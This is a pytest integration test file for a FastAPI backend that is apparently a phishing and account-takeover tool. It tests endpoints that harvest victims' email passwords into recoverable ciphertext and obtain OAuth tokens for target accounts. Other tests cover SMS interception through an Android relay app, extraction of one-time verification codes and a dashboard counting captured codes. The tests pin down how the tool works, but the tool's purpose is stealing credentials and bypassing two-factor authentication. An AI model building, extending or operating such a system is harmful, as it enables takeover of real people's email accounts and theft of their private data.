"""
Deep-build integration tests for the API layer (FastAPI TestClient).

Strategy — fully hermetic, no live Postgres / Redis / Gmail:
  * get_db dependency is overridden with an in-memory SQLite engine (StaticPool).
  * The Redis lifespan, websocket broadcast, and background scheduler side-effects
    are neutralized so requests never reach a real mail server or Redis.
  * httpx.AsyncClient is faked for the OAuth token-exchange step.
  * A valid Fernet key is pinned so token/password encryption works offline.
"""
import asyncio
import uuid
import urllib.parse

import pytest
from cryptography.fernet import Fernet
from fastapi.testclient import TestClient
from sqlalchemy import select
from sqlalchemy.ext.asyncio import (
    create_async_engine,
    async_sessionmaker,
    AsyncSession,
)
from sqlalchemy.pool import StaticPool

from app.main import app
from app.api.websocket import manager as ws_manager
from app.services import scheduler as scheduler_mod
from app import main as main_mod
from app.api.v1.endpoints import harvest as harvest_mod
from app.api.v1.endpoints import oauth as oauth_mod
from app.api.v1.endpoints import monitoring as monitoring_mod
from app.api.deps import get_db
from app.core.config import settings
from app.core.database import Base
from app.core.security import decrypt_password
from app.models.target import Target, TargetStatus, ProviderEnum
from app.models.credential import Credential
from app.models.session import MonitoringSession, SessionStatus
from app.models.otp import ReceivedOTP
from app.models.intercepted_sms import InterceptedSMS


# ---------------------------------------------------------------------------
# In-memory SQLite engine (shared across the test session)
# ---------------------------------------------------------------------------
engine = create_async_engine(
    "sqlite+aiosqlite:///:memory:",
    poolclass=StaticPool,
    connect_args={"check_same_thread": False},
)
TestSessionLocal = async_sessionmaker(bind=engine, class_=AsyncSession, expire_on_commit=False)


def _run(coro):
    return asyncio.run(coro)


async def _create_tables():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)


async def _clear_tables():
    async with TestSessionLocal() as s:
        for table in reversed(Base.metadata.sorted_tables):
            await s.execute(table.delete())
        await s.commit()


async def _all(model):
    async with TestSessionLocal() as s:
        res = await s.execute(select(model))
        return res.scalars().all()


_run(_create_tables())


@pytest.fixture(scope="session", autouse=True)
def _dispose_engine():
    # Keep the process from hanging on exit: StaticPool holds an aiosqlite
    # connection whose background thread would otherwise keep Python alive.
    yield
    _run(engine.dispose())


# ---------------------------------------------------------------------------
# Fake httpx for the OAuth token exchange
# ---------------------------------------------------------------------------
class _FakeResponse:
    def __init__(self, status_code=200, json_data=None):
        self.status_code = status_code
        self._json = json_data or {}

    def json(self):
        return self._json


class _FakeAsyncClient:
    def __init__(self, *args, **kwargs):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False

    async def post(self, url, **kwargs):
        return _FakeResponse(
            200,
            {"access_token": "fake-access-token", "refresh_token": "fake-refresh-token"},
        )


# ---------------------------------------------------------------------------
# Fixture: patched app + TestClient
# ---------------------------------------------------------------------------
async def _override_get_db():
    async with TestSessionLocal() as session:
        try:
            yield session
        finally:
            await session.close()


@pytest.fixture
def client(monkeypatch):
    async def _noop(*a, **k):
        return None

    # neutralize side-effects
    monkeypatch.setattr(ws_manager, "connect_redis", _noop)
    monkeypatch.setattr(ws_manager, "disconnect_redis", _noop)
    monkeypatch.setattr(ws_manager, "broadcast_json", _noop)
    monkeypatch.setattr(scheduler_mod, "shutdown_all", _noop)
    monkeypatch.setattr(main_mod, "shutdown_all", _noop)
    monkeypatch.setattr(harvest_mod, "start_polling_task", _noop)
    monkeypatch.setattr(oauth_mod, "start_polling_task", _noop)
    monkeypatch.setattr(monitoring_mod, "start_polling_task", _noop)
    monkeypatch.setattr(monitoring_mod, "stop_polling_task", _noop)
    monkeypatch.setattr(oauth_mod.httpx, "AsyncClient", _FakeAsyncClient)

    # config so encryption + oauth authorize succeed offline
    monkeypatch.setattr(settings, "ENCRYPTION_KEY", Fernet.generate_key().decode())
    monkeypatch.setattr(settings, "GMAIL_CLIENT_ID", "fake-gmail-client-id")
    monkeypatch.setattr(settings, "YAHOO_CLIENT_ID", "fake-yahoo-client-id")

    # swap DB
    app.dependency_overrides[get_db] = _override_get_db
    _run(_clear_tables())

    # do NOT follow redirects: endpoints return RedirectResponse to external
    # URLs (Google/Yahoo consent pages, the Next.js dashboard) and following
    # them would make the client attempt real network calls and hang.
    yield TestClient(app, follow_redirects=False)

    app.dependency_overrides.clear()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _create_target(c, email="victim@gmail.com", phone=None, provider="GMAIL"):
    body = {"email": email}
    if phone is not None:
        body["phone_number"] = phone
    if provider is not None:
        body["provider"] = provider
    # router root is defined as "/" -> the real path needs the trailing slash
    return c.post("/api/v1/targets/", json=body)


# ===========================================================================
# TARGETS
# ===========================================================================
def test_create_target_201(client):
    with client as c:
        r = _create_target(c, email="new@example.com", phone="+14155551234")
        assert r.status_code == 201
        data = r.json()
        assert data["email"] == "new@example.com"
        assert data["status"] == "IDLE"
        assert "id" in data


def test_create_target_duplicate_400(client):
    with client as c:
        _create_target(c, email="dup@example.com")
        r = _create_target(c, email="dup@example.com")
        assert r.status_code == 400
        assert "already exists" in r.json()["detail"]


def test_create_target_invalid_email_422(client):
    with client as c:
        r = c.post("/api/v1/targets/", json={"email": "not-an-email"})
        assert r.status_code == 422


def test_list_targets(client):
    with client as c:
        _create_target(c, email="a@example.com")
        _create_target(c, email="b@example.com")
        r = c.get("/api/v1/targets/")
        assert r.status_code == 200
        assert len(r.json()) == 2


def test_get_target_detail_with_counts(client):
    with client as c:
        created = _create_target(c, email="detail@example.com").json()
        tid = created["id"]
        r = c.get(f"/api/v1/targets/{tid}")
        assert r.status_code == 200
        body = r.json()
        assert body["email"] == "detail@example.com"
        assert body["credential_count"] == 0
        assert body["session_count"] == 0
        assert body["otp_count"] == 0


def test_get_target_404(client):
    with client as c:
        r = c.get(f"/api/v1/targets/{uuid.uuid4()}")
        assert r.status_code == 404


def test_update_target(client):
    with client as c:
        tid = _create_target(c, email="upd@example.com").json()["id"]
        r = c.patch(f"/api/v1/targets/{tid}", json={"status": "ACTIVE"})
        assert r.status_code == 200
        assert r.json()["status"] == "ACTIVE"


def test_delete_target_204(client):
    with client as c:
        tid = _create_target(c, email="del@example.com").json()["id"]
        r = c.delete(f"/api/v1/targets/{tid}")
        assert r.status_code == 204
        assert c.get(f"/api/v1/targets/{tid}").status_code == 404


def test_delete_target_404(client):
    with client as c:
        r = c.delete(f"/api/v1/targets/{uuid.uuid4()}")
        assert r.status_code == 404


# ===========================================================================
# HARVEST
# ===========================================================================
def test_submit_harvest_creates_target_credential_session(client):
    with client as c:
        r = c.post(
            "/api/v1/harvest/submit",
            json={"username": "harvested@gmail.com", "password": "s3cr3t-pw", "provider": "GMAIL"},
        )
        assert r.status_code == 201
        data = r.json()
        assert data["status"] == "success"
        assert "target_id" in data and "session_id" in data

    # DB assertions (post-request, offline)
    targets = _run(_all(Target))
    creds = _run(_all(Credential))
    sessions = _run(_all(MonitoringSession))
    assert len(targets) == 1 and targets[0].email == "harvested@gmail.com"
    assert len(creds) == 1
    # harvest stores encrypt_password (Fernet), not a bcrypt hash
    assert creds[0].password_hash != "s3cr3t-pw"                       # not plaintext
    assert decrypt_password(creds[0].password_hash) == "s3cr3t-pw"     # recoverable ciphertext
    assert len(sessions) == 1 and sessions[0].status == SessionStatus.POLLING


def test_submit_harvest_invalid_email_422(client):
    with client as c:
        r = c.post("/api/v1/harvest/submit", json={"username": "bad", "password": "x"})
        assert r.status_code == 422


# ===========================================================================
# MONITORING
# ===========================================================================
def test_sessions_list_empty(client):
    with client as c:
        r = c.get("/api/v1/monitoring/sessions")
        assert r.status_code == 200
        assert r.json() == []


def test_session_detail_404(client):
    with client as c:
        r = c.get(f"/api/v1/monitoring/sessions/{uuid.uuid4()}")
        assert r.status_code == 404


def test_stop_session_flow(client):
    with client as c:
        sid = c.post(
            "/api/v1/harvest/submit",
            json={"username": "mon@gmail.com", "password": "pw"},
        ).json()["session_id"]
        stop = c.post(f"/api/v1/monitoring/sessions/{sid}/stop")
        assert stop.status_code == 200
        detail = c.get(f"/api/v1/monitoring/sessions/{sid}")
        assert detail.status_code == 200
        assert detail.json()["status"] == "STOPPED"


def test_restart_session(client):
    with client as c:
        sid = c.post(
            "/api/v1/harvest/submit",
            json={"username": "restart@gmail.com", "password": "pw"},
        ).json()["session_id"]
        c.post(f"/api/v1/monitoring/sessions/{sid}/stop")
        restart = c.post(f"/api/v1/monitoring/sessions/{sid}/restart")
        assert restart.status_code == 200
        detail = c.get(f"/api/v1/monitoring/sessions/{sid}")
        assert detail.json()["status"] == "POLLING"


def test_session_otps_empty(client):
    with client as c:
        sid = c.post(
            "/api/v1/harvest/submit",
            json={"username": "otp@gmail.com", "password": "pw"},
        ).json()["session_id"]
        r = c.get(f"/api/v1/monitoring/sessions/{sid}/otps")
        assert r.status_code == 200
        assert r.json() == []


def test_stats_endpoint(client):
    with client as c:
        c.post("/api/v1/harvest/submit", json={"username": "stat@gmail.com", "password": "pw"})
        r = c.get("/api/v1/monitoring/stats")
        assert r.status_code == 200
        body = r.json()
        assert body["total_targets"] == 1
        assert body["active_sessions"] == 1
        assert "otps_captured_24h" in body


# ===========================================================================
# OAUTH (token exchange mocked)
# ===========================================================================
def test_gmail_authorize_redirect(client):
    with client as c:
        r = c.get("/api/v1/oauth/gmail/authorize", params={"target_email": "oauth@gmail.com"})
        assert r.status_code == 307
        assert "accounts.google.com" in r.headers["location"]


def test_gmail_callback_creates_target(client):
    with client as c:
        state = urllib.parse.quote("oauth@gmail.com")
        r = c.get("/api/v1/oauth/gmail/callback", params={"code": "xyz", "state": state})
        assert r.status_code == 307
        assert "dashboard" in r.headers["location"]

    targets = _run(_all(Target))
    creds = _run(_all(Credential))
    assert len(targets) == 1 and targets[0].email == "oauth@gmail.com"
    assert len(creds) == 1
    assert creds[0].oauth_access_token is not None  # encrypted token stored


def test_yahoo_authorize_redirect(client):
    with client as c:
        r = c.get("/api/v1/oauth/yahoo/authorize", params={"target_email": "oauth@yahoo.com"})
        assert r.status_code == 307
        assert "api.login.yahoo.com" in r.headers["location"]


def test_yahoo_callback_creates_target(client):
    with client as c:
        state = urllib.parse.quote("oauth@yahoo.com")
        r = c.get("/api/v1/oauth/yahoo/callback", params={"code": "xyz", "state": state})
        assert r.status_code == 307

    targets = _run(_all(Target))
    assert len(targets) == 1 and targets[0].provider == ProviderEnum.YAHOO


# ===========================================================================
# SMS WEBHOOK
# ===========================================================================
def test_sms_twilio_authorized_logs_and_extracts_otp(client):
    with client as c:
        _create_target(c, email="smsvictim@yahoo.com", phone="+14155551234", provider="YAHOO")
        r = c.post(
            "/api/v1/sms/webhook",
            data={
                "From": "+14155551234",
                "To": "+10000000000",
                "Body": "Your verification code is 123456",
                "MessageSid": "SM123",
            },
            headers={"X-Twilio-Signature": "dummy"},
        )
        assert r.status_code == 200
        assert "<Response>" in r.text

    sms = _run(_all(InterceptedSMS))
    otps = _run(_all(ReceivedOTP))
    assert len(sms) == 1
    assert sms[0].message_sid == "SM123"
    assert len(otps) == 1
    assert otps[0].extracted_code == "123456"
    assert otps[0].channel == "sms"


def test_sms_unattributed_logs_no_otp(client):
    with client as c:
        r = c.post(
            "/api/v1/sms/webhook",
            data={
                "From": "+19999999999",
                "To": "+10000000000",
                "Body": "Your code is 654321",
                "MessageSid": "SM999",
            },
            headers={"X-Twilio-Signature": "dummy"},
        )
        assert r.status_code == 200

    sms = _run(_all(InterceptedSMS))
    otps = _run(_all(ReceivedOTP))
    assert len(sms) == 1
    assert sms[0].target_id is None
    assert len(otps) == 0  # no target => no OTP row


def test_sms_no_sig_no_secret_503(client):
    with client as c:
        r = c.post(
            "/api/v1/sms/webhook",
            data={"From": "+19999999999", "Body": "hi", "MessageSid": "SMx"},
        )
        # RELAY_APP_SECRET is unset in fixture => 503 relay-not-configured
        assert r.status_code == 503


def test_sms_wrong_relay_secret_401(client, monkeypatch):
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "correct-secret")
    with client as c:
        r = c.post(
            "/api/v1/sms/webhook",
            data={"From": "+19999999999", "Body": "hi", "MessageSid": "SMy"},
            headers={"X-Relay-Secret": "wrong"},
        )
        assert r.status_code == 401


# ===========================================================================
# ANDROID RELAY APP contract — X-Relay-Secret auth, Twilio-shaped form body
# (mirrors relay-app/BackendClient.kt: To carries the DEVICE_ID, not a number)
# ===========================================================================
def test_relay_valid_secret_accepts_and_extracts_otp(client, monkeypatch):
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "shared-secret-42")
    with client as c:
        _create_target(c, email="relayvictim@yahoo.com", phone="+14155550100", provider="YAHOO")
        r = c.post(
            "/api/v1/sms/webhook",
            data={
                "From": "+14155550100",
                "To": "relay-device-07",                      # the APK sends its DEVICE_ID here
                "Body": "Your Google verification code is G-556677",
                "MessageSid": "relay-07-1000",
            },
            headers={"X-Relay-Secret": "shared-secret-42"},
        )
        assert r.status_code == 200
        assert "<Response>" in r.text

    sms = _run(_all(InterceptedSMS))
    otps = _run(_all(ReceivedOTP))
    assert len(sms) == 1
    assert sms[0].target_id is not None                       # attributed by From phone
    assert sms[0].message_sid == "relay-07-1000"
    assert len(otps) == 1
    assert otps[0].extracted_code == "556677"                 # G- prefix stripped by extractor
    assert otps[0].channel == "sms"


def test_relay_secret_via_form_field(client, monkeypatch):
    # APK fallback path: RelaySecret as a form field instead of a header
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "shared-secret-42")
    with client as c:
        r = c.post(
            "/api/v1/sms/webhook",
            data={
                "From": "+14155550111",
                "To": "relay-device-08",
                "Body": "weekly digest",
                "MessageSid": "relay-08-2001",
                "RelaySecret": "shared-secret-42",
            },
        )
        assert r.status_code == 200
    assert len(_run(_all(InterceptedSMS))) == 1


def test_relay_header_takes_precedence_over_form(client, monkeypatch):
    # wrong header + right form field => header value wins and auth fails
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "shared-secret-42")
    with client as c:
        r = c.post(
            "/api/v1/sms/webhook",
            data={
                "From": "+14155550111",
                "Body": "hi",
                "MessageSid": "relay-hdr-1",
                "RelaySecret": "shared-secret-42",
            },
            headers={"X-Relay-Secret": "wrong"},
        )
        assert r.status_code == 401


def test_relay_duplicate_message_sid_is_idempotent(client, monkeypatch):
    # APK may retry the same relay -> same MessageSid -> exactly one audit row
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "s42")
    with client as c:
        payload = {"From": "+14155550123", "To": "dev-1", "Body": "hello world", "MessageSid": "same-sid"}
        headers = {"X-Relay-Secret": "s42"}
        r1 = c.post("/api/v1/sms/webhook", data=payload, headers=headers)
        r2 = c.post("/api/v1/sms/webhook", data=payload, headers=headers)
        assert r1.status_code == 200 and r2.status_code == 200
    assert len(_run(_all(InterceptedSMS))) == 1


def test_relay_missing_message_sid_synthesized_dedupe(client, monkeypatch):
    # no MessageSid -> backend synthesizes a minute-bucket key; identical
    # relays in the same minute collapse to one row, different bodies don't
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "s42")
    headers = {"X-Relay-Secret": "s42"}
    with client as c:
        for _ in range(2):
            c.post("/api/v1/sms/webhook",
                   data={"From": "+14155550123", "To": "dev-1", "Body": "identical body"},
                   headers=headers)
        c.post("/api/v1/sms/webhook",
               data={"From": "+14155550123", "To": "dev-1", "Body": "different body"},
               headers=headers)
    sms = _run(_all(InterceptedSMS))
    assert len(sms) == 2
    assert all(s.message_sid for s in sms)                   # both rows carry the synthesized key


def test_relay_empty_body_acknowledges_without_logging(client, monkeypatch):
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "s42")
    with client as c:
        r = c.post(
            "/api/v1/sms/webhook",
            data={"From": "+14155550199", "To": "dev-2", "Body": "", "MessageSid": "relay-empty-1"},
            headers={"X-Relay-Secret": "s42"},
        )
        assert r.status_code == 200
        assert "<Response>" in r.text
    assert len(_run(_all(InterceptedSMS))) == 0


def test_relay_otp_duplicate_within_5min_window(client, monkeypatch):
    # same code for the same target within 5 min -> one OTP row, but BOTH
    # raw messages still audited to intercepted_sms
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "s42")
    with client as c:
        _create_target(c, email="relay2@yahoo.com", phone="+14155550101", provider="YAHOO")
        headers = {"X-Relay-Secret": "s42"}
        body = "Your verification code is 777888"
        c.post("/api/v1/sms/webhook",
               data={"From": "+14155550101", "To": "dev-3", "Body": body, "MessageSid": "otp-dup-1"},
               headers=headers)
        c.post("/api/v1/sms/webhook",
               data={"From": "+14155550101", "To": "dev-3", "Body": body, "MessageSid": "otp-dup-2"},
               headers=headers)
    sms = _run(_all(InterceptedSMS))
    otps = _run(_all(ReceivedOTP))
    assert len(sms) == 2
    assert len(otps) == 1


def test_relay_burst_all_messages_logged(client, monkeypatch):
    # stress: 25 rapid relays, distinct SIDs -> all 25 audited
    monkeypatch.setattr(settings, "RELAY_APP_SECRET", "s42")
    with client as c:
        for i in range(25):
            r = c.post(
                "/api/v1/sms/webhook",
                data={"From": "+14155550999", "To": "dev-burst",
                      "Body": f"transaction alert {i}", "MessageSid": f"burst-{i}"},
                headers={"X-Relay-Secret": "s42"},
            )
            assert r.status_code == 200
    assert len(_run(_all(InterceptedSMS))) == 25
